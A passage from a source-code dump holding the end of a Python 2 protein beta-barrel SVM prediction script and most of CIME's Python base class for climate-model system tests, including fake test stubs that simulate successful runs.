\"%s/traninedsvmRadial_cyto.R --args \"%(rundir) + tmpHome+testfilename + \" > \" + svmoutPath + outputPred\n\t\tprint rcommand1\n\t\tos.system(rcommand1)\n\t\tprint \"reading prf file Innerloop\"\n\t\tIfile =boctopus_writepred2prf.start(svmoutPath, outputPred, seq, \"I\")\n                readprfFiles(svmoutPath+Ifile, pDict_inloop, pTest)\n\t\tprint\n\n\t\n               \ttestfilename = pTest + \"_extra.dat\"\n               \tget_labeledTestFiles(testX, ws_extracellular, testfilename,  Home, svmoutPath, tmpHome)\n               \t#os.system(\"cp \" + tmpHome + testfilename + \" \" + tmpHome + \"test.dat\")\n\t\toutputPred = pTest + \"_\" + str(ws_extracellular) + \"_extraloop_svmradialResult.txt\"\n               \trcommand1 = prefix + \"R --vanilla --slave < \" + \"%s/traninedsvmRadial_extra.R --args \"%(rundir) + tmpHome+testfilename + \" > \" + svmoutPath + outputPred\n\t\tprint rcommand1\n\t\tos.system(rcommand1)\n\t\tprint \"reading prf file Outloop\"\n\t\tOfile = boctopus_writepred2prf.start(svmoutPath, outputPred, seq, \"O\")\n                readprfFiles(svmoutPath+Ofile, pDict_otloop, pTest)\n\t\tprint\n\n\n                testfilename = pTest + \"_lipid.dat\"\n                get_labeledTestFiles(testX, ws_lipidfacing, testfilename,  Home, svmoutPath, tmpHome)\n                #os.system(\"cp \" + tmpHome + testfilename + \" \" + tmpHome + \"test.dat\")\n                outputPred = pTest + \"_\" + str(ws_lipidfacing) + \"_lipidfacing_svmradialResult.txt\"\n                rcommand1 = prefix + \"R --vanilla --slave < \" + \"%s/traninedsvmRadial_lipid.R --args \"%(rundir) + tmpHome+testfilename + \" > \" + svmoutPath + outputPred\n\t\tprint rcommand1\n                os.system(rcommand1)\n\t\tprint \"reading prf file lipid-facing\"\n                ofile = boctopus_writepred2prf.start(svmoutPath, outputPred, seq, \"o\")\n                readprfFiles(svmoutPath+ofile, pDict_ot, pTest)\n\t\tprint\n\t\t\n\n                testfilename = pTest + \"_pore.dat\"\n                get_labeledTestFiles(testX, ws_porefacing, testfilename,  Home, svmoutPath, tmpHome)\n                #os.system(\"cp \" + tmpHome + testfilename + \" \" + tmpHome + \"test.dat\")\n                outputPred = pTest + \"_\" + str(ws_porefacing) + \"_porefacing_svmradialResult.txt\"\n                rcommand1 = prefix + \"R --vanilla --slave < \" + \"%s/traninedsvmRadial_pore.R --args \"%(rundir) + tmpHome+testfilename + \" > \" + svmoutPath + outputPred\n\t\tprint rcommand1\n                os.system(rcommand1)\n\t\tprint \"reading prf file pore-facing\"\n                ifile = boctopus_writepred2prf.start(svmoutPath, outputPred, seq, \"i\")\n                readprfFiles(svmoutPath+ifile, pDict_in, pTest)\n\t\tprint\n\n\n\t\tprint \"---------------\"\n\t\tprint ofile, len(pDict_ot[pTest])\n\t\tprint ifile, len(pDict_in[pTest])\n\t\tprint Ifile, len(pDict_inloop[pTest])\n\t\tprint Ofile, len(pDict_otloop[pTest])\n\t\tprint \"---------------\"\n\n\t\tpflag = 0\n\t\tprint\n\t\tfor pname in pDict_in:\n\t\t\t#print \"pname\", pname, len(pDict_in[pname]), len(pDict_ot[pname])\n\n\t\t        iData = [\"i\"]\n\t\t        oData = [\"o\"]\n\t\t        inloopData  = [\"I\"]\n\t\t        outloopData = [\"O\"]\n\n\t        for i in range(0, len(pDict_in[pname])):\n\t            iData.append(float(pDict_in[pname][i][1]))\n        \t    oData.append(float(pDict_ot[pname][i][1]))\n\t            inloopData.append(float(pDict_inloop[pname][i][0]))\n        \t    outloopData.append(float(pDict_otloop[pname][i][1]))\n            \n\t        avgx, avgy = getrunning_average(pTest, iData, oData, pflag)\n\t\tstart, end = find_barrelregio(avgx, avgy)    \n\n    \t\tprint \"Barrel region: start, end, protein_length - \", start, end, len(seq)\n\n    \t\twrite_profilefile(pname, iData, oData, inloopData, outloopData, seq, start, end, Home, svmoutPath, tmpHome)\n\n\treturn\n\t#}}}\n\ndef readPSSM21Files_3class(filename, proteinName):\n\tprint filename\n\n        f     = open(filename, \"r\")\n        lines = f.readlines()\n        f.close()\n\n\tproteinDict = {}\n\tproteinDict[proteinName] = []\n\n        for line in lines:\n                line = line.strip()\n                line = string.split(line)\n\t\t\n\t        proteinDict[proteinName].append(line)\n\t\t\t\n        return proteinDict\n\n\ndef startPredicting(outHome, ws_cytosolic, ws_extracellular, ws_lipidfacing, ws_porefacing, filename, proteinName, prefix, validaaSeq, path_seqfile):#{{{\n        Home = path_seqfile + \"/\"\n        svmoutHome = path_seqfile + \"/svmoutput/\"\n        outHome    = path_seqfile + \"/output/\"\n        tmpHome    = path_seqfile + \"/tmp/\"\n        svmoutPath = svmoutHome\n        print \"startPredicting in boctopus_predictsvm.py\"\n\n        proteinDict = readPSSM21Files_3class(filename, proteinName)\n\n        #for protein in proteinDict.keys():\n        #        print protein, len(proteinDict[protein])\n        actualPred(proteinDict, ws_cytosolic, ws_extracellular, ws_lipidfacing, ws_porefacing, outHome, prefix, validaaSeq, Home, svmoutPath, tmpHome)\n\n        return\n#}}}\n"}
{"blob_id": "623d320abd218e196c371380ebbbbaf12d225c07", "directory_id": "275c8cd6519ad67cc5cff4b9fd0ab5e5f53df607", "path": "/scripts/lib/CIME/SystemTests/system_tests_common.py", "content_id": "aa995e040c68c9d6e8d159a109cccacacf57141f", "detected_licenses": "['BSD-3-Clause', 'LicenseRef-scancode-unknown-license-reference']", "license_type": "permissive", "repo_name": "gdicker1/cime", "snapshot_id": "c46fc231e5746db046d0c7d0770d1099cb9f92e2", "revision_id": "588039c8e90b083fb3df93580d54fa0ffa80a311", "branch_name": "refs/heads/master", "visit_date": "2022-10-03 21:17:47.886042", "revision_date": "2020-05-18 17:25:23", "committer_date": "2020-05-18 17:25:23", "github_id": "265605727", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2020-05-20 15:20:08", "gha_created_at": "2020-05-20 15:20:07", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "33638", "extension": "py", "content": "\"\"\"\nBase class for CIME system tests\n\"\"\"\nfrom CIME.XML.standard_module_setup import *\nfrom CIME.XML.env_run import EnvRun\nfrom CIME.utils import append_testlog, get_model, safe_copy, get_timestamp, CIMEError\nfrom CIME.test_status import *\nfrom CIME.hist_utils import copy_histfiles, compare_test, generate_teststatus, \\\n    compare_baseline, get_ts_synopsis, generate_baseline\nfrom CIME.provenance import save_test_time, get_test_success\nfrom CIME.locked_files import LOCKED_DIR, lock_file, is_locked\nimport CIME.build as build\n\nimport glob, gzip, time, traceback, six\n\nlogger = logging.getLogger(__name__)\n\nclass SystemTestsCommon(object):\n\n    def __init__(self, case, expected=None):\n        \"\"\"\n        initialize a CIME system test object, if the locked env_run.orig.xml\n        does not exist copy the current env_run.xml file.  If it does exist restore values\n        changed in a previous run of the test.\n        \"\"\"\n        self._case = case\n        caseroot = case.get_value(\"CASEROOT\")\n        self._caseroot = caseroot\n        self._orig_caseroot = caseroot\n        self._runstatus = None\n        self._casebaseid = self._case.get_value(\"CASEBASEID\")\n        self._test_status = TestStatus(test_dir=caseroot, test_name=self._casebaseid)\n        self._init_environment(caseroot)\n        self._init_locked_files(caseroot, expected)\n        self._skip_pnl = False\n        self._cpllog = \"med\" if self._case.get_value(\"COMP_INTERFACE\")==\"nuopc\" else \"cpl\"\n        self._old_build = False\n        self._ninja     = False\n        self._dry_run   = False\n\n    def _init_environment(self, caseroot):\n        \"\"\"\n        Do initializations of environment variables that are needed in __init__\n        \"\"\"\n        # Needed for sh scripts\n        os.environ[\"CASEROOT\"] = caseroot\n\n    def _init_locked_files(self, caseroot, expected):\n        \"\"\"\n        If the locked env_run.orig.xml does not exist, copy the current\n        env_run.xml file. If it does exist, restore values changed in a previous\n        run of the test.\n        \"\"\"\n        if is_locked(\"env_run.orig.xml\"):\n            self.compare_env_run(expected=expected)\n        elif os.path.isfile(os.path.join(caseroot, \"env_run.xml\")):\n            lock_file(\"env_run.xml\", caseroot=caseroot, newname=\"env_run.orig.xml\")\n\n    def _resetup_case(self, phase, reset=False):\n        \"\"\"\n        Re-setup this case. This is necessary if user is re-running an already-run\n        phase.\n        \"\"\"\n        # We never want to re-setup if we're doing the resubmitted run\n        phase_status = self._test_status.get_status(phase)\n        if reset or (self._case.get_value(\"IS_FIRST_RUN\") and phase_status != TEST_PEND_STATUS):\n\n            logging.warning(\"Resetting case due to detected re-run of phase {}\".format(phase))\n            self._case.set_initial_test_values()\n\n            self._case.case_setup(reset=True, test_mode=True)\n\n    def build(self, sharedlib_only=False, model_only=False, old_build=False, ninja=False, dry_run=False):\n        \"\"\"\n        Do NOT override this method, this method is the framework that\n        controls the build phase. build_phase is the extension point\n        that subclasses should use.\n        \"\"\"\n        success = True\n        self._old_build = old_build\n        self._ninja     = ninja\n        self._dry_run   = dry_run\n        for phase_name, phase_bool in [(SHAREDLIB_BUILD_PHASE, not model_only),\n                                       (MODEL_BUILD_PHASE, not sharedlib_only)]:\n            if phase_bool:\n                self._resetup_case(phase_name)\n                with self._test_status:\n                    self._test_status.set_status(phase_name, TEST_PEND_STATUS)\n\n                start_time = time.time()\n                try:\n                    self.build_phase(sharedlib_only=(phase_name==SHAREDLIB_BUILD_PHASE),\n                                     model_only=(phase_name==MODEL_BUILD_PHASE))\n                except BaseException as e: # We want KeyboardInterrupts to generate FAIL status\n                    success = False\n                    if isinstance(e, CIMEError):\n                        # Don't want to print stacktrace for a build failure since that\n                        # is not a CIME/infrastructure problem.\n                        excmsg = str(e)\n                    else:\n                        excmsg = \"Exception during build:\\n{}\\n{}\".format(str(e), traceback.format_exc())\n\n                    append_testlog(excmsg, self._orig_caseroot)\n                    raise\n\n                finally:\n                    time_taken = time.time() - start_time\n                    with self._test_status:\n                        self._test_status.set_status(phase_name, TEST_PASS_STATUS if success else TEST_FAIL_STATUS, comments=(\"time={:d}\".format(int(time_taken))))\n\n        return success\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        \"\"\"\n        This is the default build phase implementation, it just does an individual build.\n        This is the subclass' extension point if they need to define a custom build\n        phase.\n\n        PLEASE THROW EXCEPTION ON FAIL\n        \"\"\"\n        self.build_indv(sharedlib_only=sharedlib_only, model_only=model_only)\n\n    def build_indv(self, sharedlib_only=False, model_only=False):\n        \"\"\"\n        Perform an individual build\n        \"\"\"\n        model = self._case.get_value('MODEL')\n        build.case_build(self._caseroot, case=self._case,\n                         sharedlib_only=sharedlib_only, model_only=model_only,\n                         save_build_provenance=not model=='cesm',\n                         use_old=self._old_build, ninja=self._ninja, dry_run=self._dry_run)\n\n    def clean_build(self, comps=None):\n        if comps is None:\n            comps = [x.lower() for x in self._case.get_values(\"COMP_CLASSES\")]\n        build.clean(self._case, cleanlist=comps)\n\n    def run(self, skip_pnl=False):\n        \"\"\"\n        Do NOT override this method, this method is the framework that controls\n        the run phase. run_phase is the extension point that subclasses should use.\n        \"\"\"\n        success = True\n        start_time = time.time()\n        self._skip_pnl = skip_pnl\n        try:\n            self._resetup_case(RUN_PHASE)\n            with self._test_status:\n                self._test_status.set_status(RUN_PHASE, TEST_PEND_STATUS)\n\n            self.run_phase()\n\n            if self._case.get_value(\"GENERATE_BASELINE\"):\n                self._phase_modifying_call(GENERATE_PHASE, self._generate_baseline)\n\n            if self._case.get_value(\"COMPARE_BASELINE\"):\n                self._phase_modifying_call(BASELINE_PHASE,   self._compare_baseline)\n                self._phase_modifying_call(MEMCOMP_PHASE,    self._compare_memory)\n                self._phase_modifying_call(THROUGHPUT_PHASE, self._compare_throughput)\n\n            self._phase_modifying_call(MEMLEAK_PHASE, self._check_for_memleak)\n\n            self._phase_modifying_call(STARCHIVE_PHASE, self._st_archive_case_test)\n\n        except BaseException as e: # We want KeyboardInterrupts to generate FAIL status\n            success = False\n            if isinstance(e, CIMEError):\n                # Don't want to print stacktrace for a model failure since that\n                # is not a CIME/infrastructure problem.\n                excmsg = str(e)\n            else:\n                excmsg = \"Exception during run:\\n{}\\n{}\".format(str(e), traceback.format_exc())\n\n            append_testlog(excmsg, self._orig_caseroot)\n            raise\n\n        finally:\n            # Writing the run status should be the very last thing due to wait_for_tests\n            time_taken = time.time() - start_time\n            status = TEST_PASS_STATUS if success else TEST_FAIL_STATUS\n            with self._test_status:\n                self._test_status.set_status(RUN_PHASE, status, comments=(\"time={:d}\".format(int(time_taken))))\n\n            if get_model() == \"e3sm\":\n                # If run phase worked, remember the time it took in order to improve later walltime ests\n                baseline_root = self._case.get_value(\"BASELINE_ROOT\")\n                if success:\n                    save_test_time(baseline_root, self._casebaseid, time_taken)\n\n                # If overall things did not pass, offer the user some insight into what might have broken things\n                overall_status = self._test_status.get_overall_test_status(ignore_namelists=True)\n                if overall_status != TEST_PASS_STATUS:\n                    srcroot = self._case.get_value(\"CIMEROOT\")\n                    worked_before, last_pass, last_fail_transition = \\\n                        get_test_success(baseline_root, srcroot, self._casebaseid)\n\n                    if worked_before:\n                        if last_pass is not None:\n                            # commits between last_pass and now broke things\n                            stat, out, err = run_cmd(\"git rev-list --first-parent {}..{}\".format(last_pass, \"HEAD\"), from_dir=srcroot)\n                            if stat == 0:\n                                append_testlog(\"NEW FAIL: Potentially broken merges:\\n{}\".format(out), self._orig_caseroot)\n                            else:\n                                logger.warning(\"Unable to list potentially broken merges: {}\\n{}\".format(out, err))\n                    else:\n                        if last_pass is not None and last_fail_transition is not None:\n                            # commits between last_pass and last_fail_transition broke things\n                            stat, out, err = run_cmd(\"git rev-list --first-parent {}..{}\".format(last_pass, last_fail_transition), from_dir=srcroot)\n                            if stat == 0:\n                                append_testlog(\"OLD FAIL: Potentially broken merges:\\n{}\".format(out), self._orig_caseroot)\n                            else:\n                                logger.warning(\"Unable to list potentially broken merges: {}\\n{}\".format(out, err))\n\n            if get_model() == \"cesm\" and self._case.get_value(\"GENERATE_BASELINE\"):\n                baseline_dir = os.path.join(self._case.get_value(\"BASELINE_ROOT\"), self._case.get_value(\"BASEGEN_CASE\"))\n                generate_teststatus(self._caseroot, baseline_dir)\n\n        # We return success if the run phase worked; memleaks, diffs will NOT be taken into account\n        # with this return value.\n        return success\n\n    def run_phase(self):\n        \"\"\"\n        This is the default run phase implementation, it just does an individual run.\n        This is the subclass' extension point if they need to define a custom run phase.\n\n        PLEASE THROW AN EXCEPTION ON FAIL\n        \"\"\"\n        self.run_indv()\n\n    def _get_caseroot(self):\n        \"\"\"\n        Returns the current CASEROOT value\n        \"\"\"\n        return self._caseroot\n\n    def _set_active_case(self, case):\n        \"\"\"\n        Use for tests that have multiple cases\n        \"\"\"\n        self._case = case\n        self._case.load_env(reset=True)\n        self._caseroot = case.get_value(\"CASEROOT\")\n\n    def run_indv(self, suffix=\"base\", st_archive=False):\n        \"\"\"\n        Perform an individual run. Raises an EXCEPTION on fail.\n        \"\"\"\n        stop_n      = self._case.get_value(\"STOP_N\")\n        stop_option = self._case.get_value(\"STOP_OPTION\")\n        run_type    = self._case.get_value(\"RUN_TYPE\")\n        rundir      = self._case.get_value(\"RUNDIR\")\n        is_batch    = self._case.get_value(\"BATCH_SYSTEM\") != \"none\"\n\n        # remove any cprnc output leftover from previous runs\n        for compout in glob.iglob(os.path.join(rundir,\"*.cprnc.out\")):\n            os.remove(compout)\n\n        infostr     = \"doing an {:d} {} {} test\".format(stop_n, stop_option, run_type)\n\n        rest_option = self._case.get_value(\"REST_OPTION\")\n        if rest_option == \"none\" or rest_option == \"never\":\n            infostr += \", no restarts written\"\n        else:\n            rest_n   = self._case.get_value(\"REST_N\")\n            infostr += \", with restarts every {:d} {}\".format(rest_n, rest_option)\n\n        logger.info(infostr)\n\n        self._case.case_run(skip_pnl=self._skip_pnl, submit_resubmits=is_batch)\n\n        if not self._coupler_log_indicates_run_complete():\n            expect(False, \"Coupler did not indicate run passed\")\n\n        if suffix is not None:\n            self._component_compare_copy(suffix)\n\n        if st_archive:\n            self._case.case_st_archive(resubmit=True)\n\n    def _coupler_log_indicates_run_complete(self):\n        newestcpllogfiles = self._get_latest_cpl_logs()\n        logger.debug(\"Latest Coupler log file(s) {}\" .format(newestcpllogfiles))\n        # Exception is raised if the file is not compressed\n        allgood = len(newestcpllogfiles)\n        for cpllog in newestcpllogfiles:\n            try:\n                if six.b(\"SUCCESSFUL TERMINATION\") in gzip.open(cpllog, 'rb').read():\n                    allgood = allgood - 1\n            except Exception as e: # Probably want to be more specific here\n                msg = e.__str__()\n\n                logger.info(\"{} is not compressed, assuming run failed {}\".format(cpllog, msg))\n\n        return allgood==0\n\n    def _component_compare_copy(self, suffix):\n        comments = copy_histfiles(self._case, suffix)\n        append_testlog(comments, self._orig_caseroot)\n\n    def _component_compare_test(self, suffix1, suffix2,\n                                success_change=False,\n                                ignore_fieldlist_diffs=False):\n        \"\"\"\n        Return value is not generally checked, but is provided in case a custom\n        run case needs indirection based on success.\n        If success_change is True, success requires some files to be different.\n        If ignore_fieldlist_diffs is True, then: If the two cases differ only in their\n            field lists (i.e., all shared fields are bit-for-bit, but one case has some\n            diagnostic fields that are missing from the other case), treat the two cases\n            as identical.\n        \"\"\"\n        success, comments = self._do_compare_test(suffix1, suffix2,\n                                                  ignore_fieldlist_diffs=ignore_fieldlist_diffs)\n        if success_change:\n            success = not success\n\n        append_testlog(comments, self._orig_caseroot)\n        status = TEST_PASS_STATUS if success else TEST_FAIL_STATUS\n        with self._test_status:\n            self._test_status.set_status(\"{}_{}_{}\".format(COMPARE_PHASE, suffix1, suffix2), status)\n        return success\n\n    def _do_compare_test(self, suffix1, suffix2, ignore_fieldlist_diffs=False):\n        \"\"\"\n        Wraps the call to compare_test to facilitate replacement in unit\n        tests\n        \"\"\"\n        return compare_test(self._case, suffix1, suffix2,\n                            ignore_fieldlist_diffs=ignore_fieldlist_diffs)\n\n    def _st_archive_case_test(self):\n        result = self._case.test_env_archive()\n        with self._test_status:\n            if result:\n                self._test_status.set_status(STARCHIVE_PHASE, TEST_PASS_STATUS)\n            else:\n                self._test_status.set_status(STARCHIVE_PHASE, TEST_FAIL_STATUS)\n\n    def _get_mem_usage(self, cpllog):\n        \"\"\"\n        Examine memory usage as recorded in the cpl log file and look for unexpected\n        increases.\n        \"\"\"\n        memlist = []\n        meminfo = re.compile(r\".*model date =\\s+(\\w+).*memory =\\s+(\\d+\\.?\\d+).*highwater\")\n        if cpllog is not None and os.path.isfile(cpllog):\n            if '.gz' == cpllog[-3:]:\n                fopen = gzip.open\n            else:\n                fopen = open\n            with fopen(cpllog, \"rb\") as f:\n                for line in f:\n                    m = meminfo.match(line.decode('utf-8'))\n                    if m:\n                        memlist.append((float(m.group(1)), float(m.group(2))))\n        # Remove the last mem record, it's sometimes artificially high\n        if len(memlist) > 0:\n            memlist.pop()\n        return memlist\n\n    def _get_throughput(self, cpllog):\n        \"\"\"\n        Examine memory usage as recorded in the cpl log file and look for unexpected\n        increases.\n        \"\"\"\n        if cpllog is not None and os.path.isfile(cpllog):\n            with gzip.open(cpllog, \"rb\") as f:\n                cpltext = f.read().decode('utf-8')\n                m = re.search(r\"# simulated years / cmp-day =\\s+(\\d+\\.\\d+)\\s\",cpltext)\n                if m:\n                    return float(m.group(1))\n        return None\n\n    def _phase_modifying_call(self, phase, function):\n        \"\"\"\n        Ensures that unexpected exceptions from phases will result in a FAIL result\n        in the TestStatus file for that phase.\n        \"\"\"\n        try:\n            function()\n        except Exception as e: # Do NOT want to catch KeyboardInterrupt\n            msg = e.__str__()\n            excmsg = \"Exception during {}:\\n{}\\n{}\".format(phase, msg, traceback.format_exc())\n\n            logger.warning(excmsg)\n            append_testlog(excmsg, self._orig_caseroot)\n\n            with self._test_status:\n                self._test_status.set_status(phase, TEST_FAIL_STATUS, comments=\"exception\")\n\n    def _check_for_memleak(self):\n        \"\"\"\n        Examine memory usage as recorded in the cpl log file and look for unexpected\n        increases.\n        \"\"\"\n        with self._test_status:\n            latestcpllogs = self._get_latest_cpl_logs()\n            for cpllog in latestcpllogs:\n                memlist = self._get_mem_usage(cpllog)\n\n                if len(memlist)<3:\n                    self._test_status.set_status(MEMLEAK_PHASE, TEST_PASS_STATUS, comments=\"insuffiencient data for memleak test\")\n                else:\n                    finaldate = int(memlist[-1][0])\n                    originaldate = int(memlist[0][0])\n                    finalmem = float(memlist[-1][1])\n                    originalmem = float(memlist[0][1])\n                    memdiff = -1\n                    if originalmem > 0:\n                        memdiff = (finalmem - originalmem)/originalmem\n                    tolerance = self._case.get_value(\"TEST_MEMLEAK_TOLERANCE\")\n                    if tolerance is None:\n                        tolerance = 0.1\n                    expect(tolerance > 0.0, \"Bad value for memleak tolerance in test\")\n                    if memdiff < 0:\n                        self._test_status.set_status(MEMLEAK_PHASE, TEST_PASS_STATUS, comments=\"insuffiencient data for memleak test\")\n                    elif memdiff < tolerance:\n                        self._test_status.set_status(MEMLEAK_PHASE, TEST_PASS_STATUS)\n                    else:\n                        comment = \"memleak detected, memory went from {:f} to {:f} in {:d} days\".format(originalmem, finalmem, finaldate-originaldate)\n                        append_testlog(comment, self._orig_caseroot)\n                        self._test_status.set_status(MEMLEAK_PHASE, TEST_FAIL_STATUS, comments=comment)\n\n    def compare_env_run(self, expected=None):\n        \"\"\"\n        Compare env_run file to original and warn about differences\n        \"\"\"\n        components = self._case.get_values(\"COMP_CLASSES\")\n        f1obj = self._case.get_env(\"run\")\n        f2obj = EnvRun(self._caseroot, os.path.join(LOCKED_DIR, \"env_run.orig.xml\"), components=components)\n        diffs = f1obj.compare_xml(f2obj)\n        for key in diffs.keys():\n            if expected is not None and key in expected:\n                logging.warning(\"  Resetting {} for test\".format(key))\n                f1obj.set_value(key, f2obj.get_value(key, resolved=False))\n            else:\n                print(\"WARNING: Found difference in test {}: case: {} original value {}\".format(key, diffs[key][0], diffs[key][1]))\n                return False\n        return True\n\n    def _get_latest_cpl_logs(self):\n        \"\"\"\n        find and return the latest cpl log file in the run directory\n        \"\"\"\n        coupler_log_path = self._case.get_value(\"RUNDIR\")\n        cpllogs = glob.glob(os.path.join(coupler_log_path, '{}*.log.*'.format(self._cpllog)))\n        lastcpllogs = []\n        if cpllogs:\n            lastcpllogs.append(max(cpllogs, key=os.path.getctime))\n            basename = os.path.basename(lastcpllogs[0])\n            suffix = basename.split('.',1)[1]\n            for log in cpllogs:\n                if log in lastcpllogs:\n                    continue\n\n                if log.endswith(suffix):\n                    lastcpllogs.append(log)\n\n        return lastcpllogs\n\n    def _compare_memory(self):\n        with self._test_status:\n            # compare memory usage to baseline\n            baseline_name = self._case.get_value(\"BASECMP_CASE\")\n            basecmp_dir = os.path.join(self._case.get_value(\"BASELINE_ROOT\"), baseline_name)\n            newestcpllogfiles = self._get_latest_cpl_logs()\n            if len(newestcpllogfiles) > 0:\n                memlist = self._get_mem_usage(newestcpllogfiles[0])\n            for cpllog in newestcpllogfiles:\n                m = re.search(r\"/({}.*.log).*.gz\".format(self._cpllog),cpllog)\n                if m is not None:\n                    baselog = os.path.join(basecmp_dir, m.group(1))+\".gz\"\n                if baselog is None or not os.path.isfile(baselog):\n                    # for backward compatibility\n                    baselog = os.path.join(basecmp_dir, self._cpllog+\".log\")\n                if os.path.isfile(baselog) and len(memlist) > 3:\n                    blmem = self._get_mem_usage(baselog)\n                    blmem = 0 if blmem == [] else blmem[-1][1]\n                    curmem = memlist[-1][1]\n                    diff = 0.0 if blmem == 0 else (curmem-blmem)/blmem\n                    if diff < 0.1 and self._test_status.get_status(MEMCOMP_PHASE) is None:\n                        self._test_status.set_status(MEMCOMP_PHASE, TEST_PASS_STATUS)\n                    elif self._test_status.get_status(MEMCOMP_PHASE) != TEST_FAIL_STATUS:\n                        comment = \"Error: Memory usage increase > 10% from baseline\"\n                        self._test_status.set_status(MEMCOMP_PHASE, TEST_FAIL_STATUS, comments=comment)\n                        append_testlog(comment, self._orig_caseroot)\n\n    def _compare_throughput(self):\n        with self._test_status:\n            # compare memory usage to baseline\n            baseline_name = self._case.get_value(\"BASECMP_CASE\")\n            basecmp_dir = os.path.join(self._case.get_value(\"BASELINE_ROOT\"), baseline_name)\n            newestcpllogfiles = self._get_latest_cpl_logs()\n            for cpllog in newestcpllogfiles:\n                m = re.search(r\"/({}.*.log).*.gz\".format(self._cpllog), cpllog)\n                if m is not None:\n                    baselog = os.path.join(basecmp_dir, m.group(1))+\".gz\"\n                if baselog is None or not os.path.isfile(baselog):\n                    # for backward compatibility\n                    baselog = os.path.join(basecmp_dir, self._cpllog)\n\n                if os.path.isfile(baselog):\n                    # compare throughput to baseline\n                    current = self._get_throughput(cpllog)\n                    baseline = self._get_throughput(baselog)\n                    #comparing ypd so bigger is better\n                    if baseline is not None and current is not None:\n                        diff = (baseline - current)/baseline\n                        tolerance = self._case.get_value(\"TEST_TPUT_TOLERANCE\")\n                        if tolerance is None:\n                            tolerance = 0.1\n                        expect(tolerance > 0.0, \"Bad value for throughput tolerance in test\")\n                        if diff < tolerance and self._test_status.get_status(THROUGHPUT_PHASE) is None:\n                            self._test_status.set_status(THROUGHPUT_PHASE, TEST_PASS_STATUS)\n                        elif self._test_status.get_status(THROUGHPUT_PHASE) != TEST_FAIL_STATUS:\n                            comment = \"Error: Computation time increase > {:d} pct from baseline\".format(int(tolerance*100))\n                            self._test_status.set_status(THROUGHPUT_PHASE, TEST_FAIL_STATUS, comments=comment)\n                            append_testlog(comment, self._orig_caseroot)\n\n    def _compare_baseline(self):\n        \"\"\"\n        compare the current test output to a baseline result\n        \"\"\"\n        with self._test_status:\n            # compare baseline\n            success, comments = compare_baseline(self._case)\n            append_testlog(comments, self._orig_caseroot)\n            status = TEST_PASS_STATUS if success else TEST_FAIL_STATUS\n            baseline_name = self._case.get_value(\"BASECMP_CASE\")\n            ts_comments = os.path.dirname(baseline_name) + \": \" + get_ts_synopsis(comments)\n            self._test_status.set_status(BASELINE_PHASE, status, comments=ts_comments)\n\n    def _generate_baseline(self):\n        \"\"\"\n        generate a new baseline case based on the current test\n        \"\"\"\n        with self._test_status:\n            # generate baseline\n            success, comments = generate_baseline(self._case)\n            append_testlog(comments, self._orig_caseroot)\n            status = TEST_PASS_STATUS if success else TEST_FAIL_STATUS\n            baseline_name = self._case.get_value(\"BASEGEN_CASE\")\n            self._test_status.set_status(GENERATE_PHASE, status, comments=os.path.dirname(baseline_name))\n            basegen_dir = os.path.join(self._case.get_value(\"BASELINE_ROOT\"), self._case.get_value(\"BASEGEN_CASE\"))\n            # copy latest cpl log to baseline\n            # drop the date so that the name is generic\n            newestcpllogfiles = self._get_latest_cpl_logs()\n            for cpllog in newestcpllogfiles:\n                m = re.search(r\"/({}.*.log).*.gz\".format(self._cpllog),cpllog)\n                if m is not None:\n                    baselog = os.path.join(basegen_dir, m.group(1))+\".gz\"\n                    safe_copy(cpllog,\n                              os.path.join(basegen_dir,baselog))\n\nclass FakeTest(SystemTestsCommon):\n    \"\"\"\n    Inheriters of the FakeTest Class are intended to test the code.\n\n    All members of the FakeTest Class must\n    have names beginnig with \"TEST\" this is so that the find_system_test\n    in utils.py will work with these classes.\n    \"\"\"\n    def _set_script(self, script):\n        self._script = script # pylint: disable=attribute-defined-outside-init\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        if (not sharedlib_only):\n            exeroot = self._case.get_value(\"EXEROOT\")\n            cime_model = self._case.get_value(\"MODEL\")\n            modelexe = os.path.join(exeroot, \"{}.exe\".format(cime_model))\n\n            with open(modelexe, 'w') as f:\n                f.write(\"#!/bin/bash\\n\")\n                f.write(self._script)\n\n            os.chmod(modelexe, 0o755)\n\n            build.post_build(self._case, [], build_complete=True)\n\n    def run_indv(self, suffix=\"base\", st_archive=False):\n        mpilib = self._case.get_value(\"MPILIB\")\n        # This flag is needed by mpt to run a script under mpiexec\n        if mpilib == \"mpt\":\n            os.environ[\"MPI_SHEPHERD\"] = \"true\"\n        super(FakeTest, self).run_indv(suffix, st_archive)\n\nclass TESTRUNPASS(FakeTest):\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        script = \\\n\"\"\"\necho Insta pass\necho SUCCESSFUL TERMINATION > {rundir}/{log}.log.$LID\ncp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\n\"\"\".format(rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        FakeTest.build_phase(self,\n                             sharedlib_only=sharedlib_only, model_only=model_only)\n\nclass TESTRUNDIFF(FakeTest):\n    \"\"\"\n    You can generate a diff with this test as follows:\n    1) Run the test and generate a baseline\n    2) set TESTRUNDIFF_ALTERNATE environment variable to TRUE\n    3) Re-run the same test from step 1 but do a baseline comparison instead of generation\n      3.a) This should give you a DIFF\n    \"\"\"\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        script = \\\n\"\"\"\necho Insta pass\necho SUCCESSFUL TERMINATION > {rundir}/{log}.log.$LID\nif [ -z \"$TESTRUNDIFF_ALTERNATE\" ]; then\n  cp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\nelse\n  cp {root}/scripts/tests/cpl.hi2.nc.test {rundir}/{case}.cpl.hi.0.nc\nfi\n\"\"\".format(rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        FakeTest.build_phase(self,\n                       sharedlib_only=sharedlib_only, model_only=model_only)\n\nclass TESTTESTDIFF(FakeTest):\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = 